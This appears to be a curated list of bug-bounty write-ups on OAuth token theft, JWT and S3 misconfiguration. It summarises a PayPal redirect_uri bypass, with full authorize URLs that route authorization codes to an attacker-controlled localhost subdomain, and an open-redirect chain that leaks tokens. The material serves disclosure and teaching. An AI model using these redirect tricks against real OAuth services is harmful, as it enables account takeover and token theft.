- [All your Paypal OAuth tokens belong to me - localhost for the win](http://blog.intothesymmetry.com/2016/11/all-your-paypal-tokens-belong-to-me.html) by Antonio Sanso
  - Basically like many online internet services "Paypal" offers the option to register you own "Paypal" application via a Dashboard. The better news (for "Paypal") is that they actually employs an "exact matching policy" for `redirect_uri`.
  - While testing hhis own OAuth client, the author have noticed something a bit fishy. The easier way to describe it is using an OAuth application from "Paypal" itself. Basically "Paypal" has setup a "Demo Paypal application" to showcase their OAuth functionalities.
  - The inital OAuth request:
    - `https://www.paypal.com/signin/authorize?client_id=AdcKahCXxhLAuoIeOotpvizsVOX5k2A0VZGHxZnQHoo1Ap9ChOV0XqPdZXQt&response_type=code&scope=openid%20profile%20email%20address%20phone%20https://uri.paypal.com/services/paypalattributes%20https://uri.paypal.com/services/paypalattributes/business%20https://uri.paypal.com/services/expresscheckout&redirect_uri=https://demo.paypal.com/loginsuccessful&nonce=&newUI=Y`
  - The author found out that the "Paypal authorization server" was also accepting `localhost` as `redirect_uri`. So:
    - `https://www.paypal.com/signin/authorize?client_id=AdcKahCXxhLAuoIeOotpvizsVOX5k2A0VZGHxZnQHoo1Ap9ChOV0XqPdZXQt&response_type=code&scope=openid%20profile%20email%20address%20phone%20https://uri.paypal.com/services/paypalattributes%20https://uri.paypal.com/services/paypalattributes/business%20https://uri.paypal.com/services/expresscheckout&redirect_uri=https://localhost&nonce=&newUI=Y`
    - This was still a valid request and the authorization code was then delivered back to `localhost`. But not a vulnerability.
  - The next natural step was to creat a DNS entry for his website looking like `http://localhost.intothesymmetry.com/` and tried:
    - `https://www.paypal.com/signin/authorize?client_id=AdcKahCXxhLAuoIeOotpvizsVOX5k2A0VZGHxZnQHoo1Ap9ChOV0XqPdZXQt&response_type=code&scope=openid%20profile%20email%20address%20phone%20https://uri.paypal.com/services/paypalattributes%20https://uri.paypal.com/services/paypalattributes/business%20https://uri.paypal.com/services/expresscheckout&redirect_uri=http://localhost.intothesymmetry.com/&nonce=&newUI=Y`. Worked.
- [Full Account Takeover via Referer Header (OAuth token Steal, Open Redirect Vulnerability Chaining)](https://medium.com/@protector47/full-account-takeover-via-referrer-header-oauth-token-steal-open-redirect-vulnerability-chaining-324a14a1567) by M.Asim Shahzad
  - The author was able to steal "OAuth token" via "open redirect" chaining. "session tokens" / "access tokens" / "OAuth token" are highly sensitive data because if an attacker gets this information then he can log in your account without knowing your account password. Usually this vulnerability found on those applications who use third-party login methods like login with Facebook, Google, Twitter etc.
  - "Redacted" has a login with Facebook, Google, Twitter functionality. When the author was trying to log in his account and then he checed his Burpsuite "History", he got an endpoint containing "OAuth token" and there was another parameter called `redirect_uri` for redirecting.
    - `https://redacted.com/?oauth=gfhju76554678ggfr576898gfhj&redirect_uri=https://test.com`

### JSON Web Token
- [How I got access to millions of -redacted- accounts](https://bitquark.co.uk/blog/2016/02/09/how_i_got_access_to_millions_of_redacted_accounts) by Bitquark

### S3 Bucket

- [S3 Bucket Misconfiguration: From Basics to Pawn](https://bugbountypoc.com/s3-bucket-misconfiguration-from-basics-to-pawn/) by JAY JANI
- [AWS S3 added to my "Bucket" list](https://medium.com/bugbountywriteup/bugbounty-aws-s3-added-to-my-bucket-list-f68dd7d0d1ce) by Avinash Jain

